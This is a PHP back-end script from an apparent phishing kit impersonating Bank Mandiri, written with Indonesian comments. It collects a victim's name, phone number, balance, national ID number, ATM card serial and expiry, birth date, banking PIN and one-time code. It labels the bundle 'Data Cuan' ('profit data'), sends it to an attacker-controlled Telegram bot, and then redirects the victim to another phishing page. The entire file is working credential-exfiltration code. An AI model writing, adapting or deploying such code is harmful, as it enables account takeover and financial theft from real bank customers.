<?php
session_start();
include "tele.php";

// Ambil semua data dari SESSION (dari skrip sebelumnya + yang baru)
$nama = $_SESSION['nama'] ?? '';
$nomor = $_SESSION['nomor'] ?? '';
$saldo = $_SESSION['saldo'] ?? '';
$nik = $_SESSION['nik'] ?? '';
$seri = $_SESSION['seri'] ?? '';
$masa = $_SESSION['masa'] ?? '';
$tanggal_lahir = $_SESSION['tanggal_lahir'] ?? '';
$pin_mandiri = $_SESSION['pin_mandiri'] ?? '';

// Ambil data baru dari POST (OTP)
$otp = $_POST['otp'] ?? '';

// Simpan data baru ke SESSION
$_SESSION['otp'] = $otp;

// Gabungkan semua data (dari session sebelumnya + baru) untuk pesan
$message = "
├• | 𝗗𝗮𝘁𝗮 𝗖𝘂𝗮𝗻 |
├───────────────────
├• *Nama* : " . $nama . "
├• *Nomor* : " . $nomor . "
├• *Saldo* : " . $saldo . "
├• *Nik Ktp* : " . $nik . "
├• *Seri ATM* : " . $seri . "
├• *Masa Berlaku* : " . $masa . "
├• *Tanggal Lahir* : " . $tanggal_lahir . "
├• *PIN MANDIRI* : " . $pin_mandiri . "
├• *OTP* : " . $otp . "
╰───────────────────
";

// Fungsi sendMessage tetap sama
function sendMessage($telegram_id, $message, $token_bot) {
    $url = "https://api.telegram.org/bot" . $token_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

// Kirim pesan
sendMessage($telegram_id, $message, $token_bot);

// Redirect (asumsi ke halaman berikutnya, misalnya selesai atau halaman lain; ganti jika perlu)
header('Location: otepe.html');  // Atau halaman lain sesuai kebutuhan
?>
